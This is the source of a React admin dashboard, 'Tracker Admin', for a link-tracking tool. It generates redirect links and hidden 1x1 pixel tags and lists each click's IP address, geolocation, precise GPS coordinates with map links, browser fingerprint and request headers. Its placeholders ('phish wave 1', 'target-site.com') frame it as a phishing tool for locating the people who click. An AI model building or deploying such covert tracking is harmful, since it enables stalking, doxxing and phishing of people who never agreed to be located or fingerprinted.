'use client';

import { useState, useTransition } from 'react';
import { createLink, deleteLink } from './actions';

type Link = { code: string; destination: string; label: string | null; created_at: string };
type Capture = {
  id: number; code: string; timestamp: string; ip: string;
  x_forwarded_for: string | null; user_agent: string | null; referer: string | null;
  geo_country: string | null; geo_region: string | null; geo_city: string | null;
  geo_lat: number | null; geo_lon: number | null;
  precise_lat: number | null; precise_lon: number | null; precise_accuracy: number | null;
  js_screen: string | null; js_timezone: string | null; js_platform: string | null;
  js_language: string | null; js_raw: Record<string, unknown> | null;
  headers: Record<string, string> | null; source: string;
};
type Stats = { total: string; unique_ips: string; countries: string; with_gps: string };

export default function AdminShell({
  allLinks, captures, stats, filterCode,
}: {
  allLinks: Link[]; captures: Capture[]; stats: Stats; filterCode: string | null;
}) {
  const [expanded, setExpanded] = useState<Set<number>>(new Set());
  const [newLink, setNewLink] = useState<{ code: string; destination: string } | null>(null);
  const [flash, setFlash] = useState<{ type: 'ok' | 'err'; msg: string } | null>(null);
  const [pending, startTransition] = useTransition();
  const baseUrl = typeof window !== 'undefined' ? window.location.origin : '';

  function toggleRow(id: number) {
    setExpanded((s) => { const n = new Set(s); n.has(id) ? n.delete(id) : n.add(id); return n; });
  }

  async function handleCreate(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const fd = new FormData(e.currentTarget);
    const dest = (fd.get('destination') as string).trim();
    if (!dest.startsWith('http')) { setFlash({ type: 'err', msg: 'URL must start with http:// or https://' }); return; }
    const code = (fd.get('code') as string).trim() || Math.random().toString(36).slice(2, 9);
    fd.set('code', code);
    startTransition(async () => {
      await createLink(fd);
      setNewLink({ code, destination: dest });
      setFlash({ type: 'ok', msg: `Link /r/${code} created.` });
      (e.target as HTMLFormElement).reset();
    });
  }

  function copy(text: string, btn: HTMLButtonElement) {
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = 'Copied!'; btn.style.color = '#5dba6b';
      setTimeout(() => { btn.textContent = 'Copy'; btn.style.color = ''; }, 2000);
    });
  }

  return (
    <>
      <style>{`
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#0d0d0d;color:#d8d8d8;font-size:13px}
        a{color:inherit;text-decoration:none}
        .topbar{background:#111;border-bottom:1px solid #222;padding:12px 20px;display:flex;align-items:center;gap:12px}
        .topbar h1{font-size:15px;font-weight:600;color:#fff}
        .badge{background:#1c3320;color:#5dba6b;font-size:10px;padding:2px 8px;border-radius:3px}
        .create-panel{background:#111;border-bottom:1px solid #222;padding:14px 20px}
        .create-panel h2{font-size:11px;color:#555;text-transform:uppercase;letter-spacing:.06em;margin-bottom:10px}
        .create-form{display:flex;gap:8px;flex-wrap:wrap;align-items:flex-end}
        .field{display:flex;flex-direction:column;gap:4px}
        .field label{font-size:10px;color:#555;text-transform:uppercase;letter-spacing:.05em}
        .field input{background:#1a1a1a;border:1px solid #2a2a2a;color:#e0e0e0;padding:6px 10px;border-radius:4px;font-size:13px;outline:none}
        .field input:focus{border-color:#555}
        .field input::placeholder{color:#444}
        .url-input{width:340px}
        .code-input{width:130px;font-family:monospace}
        .label-input{width:150px}
        .create-btn{background:#1f3a28;border:1px solid #2e5c3a;color:#6dcc82;padding:7px 16px;border-radius:4px;cursor:pointer;font-size:13px;font-weight:500;white-space:nowrap}
        .create-btn:hover{background:#254530}
        .flash{padding:7px 12px;border-radius:4px;font-size:12px;margin-bottom:8px}
        .flash.ok{background:#1a3320;border:1px solid #2a5030;color:#6dcc82}
        .flash.err{background:#3a1a1a;border:1px solid #5a2a2a;color:#cc6d6d}
        .result-card{background:#141414;border:1px solid #2a2a2a;border-radius:6px;padding:12px 16px;margin-bottom:10px}
        .result-card h3{font-size:10px;color:#5dba6b;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px}
        .rg{display:grid;grid-template-columns:auto 1fr auto;gap:5px 10px;align-items:center}
        .rg .rl{font-size:10px;color:#555;text-transform:uppercase}
        .rg .rv{font-family:monospace;font-size:12px;color:#ddd;word-break:break-all}
        .copy-btn{background:#1e1e1e;border:1px solid #2e2e2e;color:#888;padding:2px 8px;border-radius:3px;cursor:pointer;font-size:10px}
        .copy-btn:hover{background:#252525}
        .linkbar{background:#111;border-bottom:1px solid #1e1e1e;padding:8px 20px;display:flex;gap:8px;flex-wrap:wrap;align-items:center}
        .chip{background:#1a1a1a;border:1px solid #2a2a2a;color:#888;padding:3px 10px;border-radius:4px;font-size:11px;display:flex;align-items:center;gap:6px}
        .chip:hover,.chip.on{border-color:#555;color:#ddd}
        .del-x{color:#555;font-size:13px;cursor:pointer;line-height:1;background:none;border:none}
        .del-x:hover{color:#cc6d6d}
        .main{padding:16px 20px}
        .stats{display:grid;grid-template-columns:repeat(4,minmax(90px,1fr));gap:10px;margin-bottom:18px}
        .stat{background:#111;border:1px solid #1e1e1e;padding:12px 14px;border-radius:6px}
        .stat .n{font-size:22px;font-weight:700;color:#fff}
        .stat .l{color:#555;font-size:11px;margin-top:2px}
        table{width:100%;border-collapse:collapse;background:#111;border:1px solid #1e1e1e;border-radius:6px;overflow:hidden}
        th{background:#161616;padding:8px 10px;text-align:left;color:#555;font-size:10px;text-transform:uppercase;letter-spacing:.06em;border-bottom:1px solid #1e1e1e;white-space:nowrap}
        td{padding:7px 10px;border-bottom:1px solid #181818;vertical-align:middle;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
        tr:last-child td{border-bottom:none}
        tr:hover td{background:#141414}
        .ip{color:#64b5f6;font-family:monospace;font-size:12px}
        .geo{color:#81c784}
        .ts{color:#555;font-family:monospace;font-size:11px;white-space:nowrap}
        .ua{color:#888}
        .codebadge{color:#ffb74d;font-family:monospace}
        .precise{color:#a5d6a7;font-weight:600}
        .accuracy{color:#555;font-size:10px}
        .pill{display:inline-block;padding:1px 5px;border-radius:3px;font-size:10px;margin-left:3px}
        .pill-gps{background:#1a3a1a;color:#5dba6b;border:1px solid #2a5030}
        .pill-ip{background:#1a2a3a;color:#64b5f6;border:1px solid #1e3a5a}
        .btn{background:#1e1e1e;border:1px solid #2e2e2e;color:#888;padding:2px 7px;border-radius:3px;cursor:pointer;font-size:10px}
        .btn:hover{background:#252525;color:#ddd}
        .dr td{background:#0a0a0a!important;padding:10px 14px 16px}
        .dg{display:grid;grid-template-columns:1fr 1fr;gap:16px}
        .ds h4{color:#444;font-size:10px;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px;margin-top:10px}
        .ds h4:first-child{margin-top:0}
        .kv{display:grid;grid-template-columns:130px 1fr;gap:1px 8px}
        .kv .k{color:#555}
        .kv .v{color:#c0c0c0;font-family:monospace;font-size:11px;word-break:break-all;white-space:normal}
        pre{background:#060606;padding:8px;border-radius:4px;font-size:10px;color:#666;overflow:auto;max-height:180px;white-space:pre-wrap;word-break:break-all}
        .empty{padding:48px;text-align:center;color:#333}
        .src-redirect{color:#ffb74d}
        .src-pixel{color:#ce93d8}
        .pending{color:#666;font-style:italic;font-size:11px}
      `}</style>

      <div className="topbar">
        <h1>Tracker Admin</h1>
        <span className="badge">AUTHORIZED USE ONLY</span>
      </div>

      {/* Create link */}
      <div className="create-panel">
        <h2>Create tracking link</h2>
        {flash && <div className={`flash ${flash.type}`}>{flash.msg}</div>}
        {newLink && (
          <div className="result-card">
            <h3>Link created</h3>
            <div className="rg">
              <span className="rl">Redirect URL</span>
              <span className="rv" id="rv-r">{baseUrl}/r/{newLink.code}</span>
              <button className="copy-btn" onClick={(e) => copy(`${baseUrl}/r/${newLink.code}`, e.currentTarget)}>Copy</button>
              <span className="rl">Pixel tag</span>
              <span className="rv" id="rv-p">{`<img src="${baseUrl}/api/pixel/${newLink.code}" width="1" height="1">`}</span>
              <button className="copy-btn" onClick={(e) => copy(`<img src="${baseUrl}/api/pixel/${newLink.code}" width="1" height="1">`, e.currentTarget)}>Copy</button>
              <span className="rl">Destination</span>
              <span className="rv" style={{ color: '#666' }}>{newLink.destination}</span>
              <span />
            </div>
          </div>
        )}
        <form className="create-form" onSubmit={handleCreate}>
          <div className="field">
            <label>Destination URL *</label>
            <input className="url-input" type="url" name="destination" placeholder="https://target-site.com" required />
          </div>
          <div className="field">
            <label>Code (optional)</label>
            <input className="code-input" type="text" name="code" placeholder="auto-generated" pattern="[A-Za-z0-9_-]+" />
          </div>
          <div className="field">
            <label>Label (optional)</label>
            <input className="label-input" type="text" name="label" placeholder="e.g. phish wave 1" />
          </div>
          <button className="create-btn" type="submit" disabled={pending}>
            {pending ? 'Creating…' : 'Generate link'}
          </button>
        </form>
      </div>

      {/* Filter bar */}
      <div className="linkbar">
        <a className={`chip${!filterCode ? ' on' : ''}`} href="/admin">All</a>
        {allLinks.map((l) => (
          <span key={l.code} className={`chip${filterCode === l.code ? ' on' : ''}`}>
            <a href={`/admin?code=${l.code}`}>/r/{l.code}</a>
            <button className="del-x" title="Delete" onClick={() => {
              if (confirm(`Delete /r/${l.code}?`)) startTransition(() => deleteLink(l.code));
            }}>×</button>
          </span>
        ))}
      </div>

      {/* Stats + table */}
      <div className="main">
        <div className="stats">
          <div className="stat"><div className="n">{stats.total}</div><div className="l">Captures</div></div>
          <div className="stat"><div className="n">{stats.unique_ips}</div><div className="l">Unique IPs</div></div>
          <div className="stat"><div className="n">{stats.countries}</div><div className="l">Countries</div></div>
          <div className="stat"><div className="n">{stats.with_gps}</div><div className="l">GPS captures</div></div>
        </div>

        {captures.length === 0 ? (
          <div className="empty">No captures yet.</div>
        ) : (
          <table>
            <thead>
              <tr>
                <th>#</th><th>Timestamp</th><th>IP Address</th>
                <th>IP Location</th><th>GPS Location</th>
                <th>ISP</th><th>User-Agent</th><th>Code</th><th></th>
              </tr>
            </thead>
            <tbody>
              {captures.map((c) => (
                <>
                  <tr key={c.id}>
                    <td>{c.id}</td>
                    <td className="ts">{new Date(c.timestamp).toLocaleString()}</td>
                    <td className="ip">{c.ip}</td>
                    <td>
                      {c.geo_city || c.geo_country
                        ? <><span className="geo">{[c.geo_city, c.geo_country].filter(Boolean).join(', ')}</span><span className="pill pill-ip">IP</span></>
                        : <span className="pending">resolving…</span>}
                    </td>
                    <td>
                      {c.precise_lat != null ? (
                        <>
                          <span className="precise">{c.precise_lat.toFixed(5)}, {c.precise_lon!.toFixed(5)}</span>
                          <span className="accuracy"> ±{Math.round(c.precise_accuracy ?? 0)}m</span>
                          <span className="pill pill-gps">GPS</span>
                          <br />
                          <a href={`https://maps.google.com/?q=${c.precise_lat},${c.precise_lon}`}
                             target="_blank" rel="noreferrer"
                             style={{ color: '#64b5f6', fontSize: 10 }}>map ↗</a>
                        </>
                      ) : '—'}
                    </td>
                    <td style={{ color: '#999', maxWidth: 140 }}>{c.source === 'redirect' ? (c.x_forwarded_for ?? '—') : '—'}</td>
                    <td className="ua" title={c.user_agent ?? ''}>{c.user_agent ?? '—'}</td>
                    <td className="codebadge">/r/{c.code}</td>
                    <td><button className="btn" onClick={() => toggleRow(c.id)}>details</button></td>
                  </tr>
                  {expanded.has(c.id) && (
                    <tr className="dr" key={`d${c.id}`}>
                      <td colSpan={9}>
                        <div className="dg">
                          <div className="ds">
                            <h4>Network / IP Geo</h4>
                            <div className="kv">
                              <span className="k">IP</span><span className="v" style={{ color: '#64b5f6' }}>{c.ip}</span>
                              <span className="k">X-Forwarded-For</span><span className="v">{c.x_forwarded_for ?? '—'}</span>
                              <span className="k">Country</span><span className="v">{c.geo_country ?? '—'}</span>
                              <span className="k">Region</span><span className="v">{c.geo_region ?? '—'}</span>
                              <span className="k">City</span><span className="v">{c.geo_city ?? '—'}</span>
                              <span className="k">Coordinates</span>
                              <span className="v">
                                {c.geo_lat
                                  ? <a href={`https://maps.google.com/?q=${c.geo_lat},${c.geo_lon}`} target="_blank" rel="noreferrer" style={{ color: '#64b5f6' }}>{c.geo_lat}, {c.geo_lon} ↗</a>
                                  : '—'}
                              </span>
                            </div>
                            {c.precise_lat != null && (
                              <>
                                <h4>Precise GPS <span className="pill pill-gps">GPS</span></h4>
                                <div className="kv">
                                  <span className="k">Latitude</span><span className="v precise">{c.precise_lat}</span>
                                  <span className="k">Longitude</span><span className="v precise">{c.precise_lon}</span>
                                  <span className="k">Accuracy</span><span className="v">±{Math.round(c.precise_accuracy ?? 0)} metres</span>
                                  <span className="k">Google Maps</span>
                                  <span className="v">
                                    <a href={`https://maps.google.com/?q=${c.precise_lat},${c.precise_lon}`} target="_blank" rel="noreferrer" style={{ color: '#64b5f6' }}>
                                      {c.precise_lat}, {c.precise_lon} ↗
                                    </a>
                                  </span>
                                </div>
                              </>
                            )}
                            {c.js_screen && (
                              <>
                                <h4>Browser Fingerprint</h4>
                                <div className="kv">
                                  <span className="k">Screen</span><span className="v">{c.js_screen}</span>
                                  <span className="k">Timezone</span><span className="v">{c.js_timezone ?? '—'}</span>
                                  <span className="k">Platform</span><span className="v">{c.js_platform ?? '—'}</span>
                                  <span className="k">Language</span><span className="v">{c.js_language ?? '—'}</span>
                                </div>
                              </>
                            )}
                          </div>
                          <div className="ds">
                            <h4>Request Headers</h4>
                            <pre>{JSON.stringify(c.headers, null, 2)}</pre>
                            <h4>Referer</h4>
                            <pre>{c.referer ?? '—'}</pre>
                          </div>
                        </div>
                      </td>
                    </tr>
                  )}
                </>
              ))}
            </tbody>
          </table>
        )}
      </div>
    </>
  );
}
